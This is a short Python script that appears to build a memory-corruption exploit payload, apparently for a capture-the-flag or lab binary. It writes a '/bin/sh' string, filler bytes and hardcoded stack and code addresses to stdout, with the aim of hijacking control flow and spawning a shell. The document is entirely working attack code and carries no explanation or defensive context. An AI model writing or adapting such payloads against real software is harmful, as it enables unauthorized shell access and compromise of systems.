#!/usr/bin/env python3

import sys
from struct import pack

bin_sh_str = b"/bin/sh\x00"

sys.stdout.buffer.write(b"\x00\x00")
sys.stdout.buffer.write(bin_sh_str)

sys.stdout.buffer.write(b"AAAAAAAA")
sys.stdout.buffer.write(b"BBBBBBBB")
sys.stdout.buffer.write(0x7ffffff6d160.to_bytes(8, 'little'))
sys.stdout.buffer.write(b"AAAAAAAA")
sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
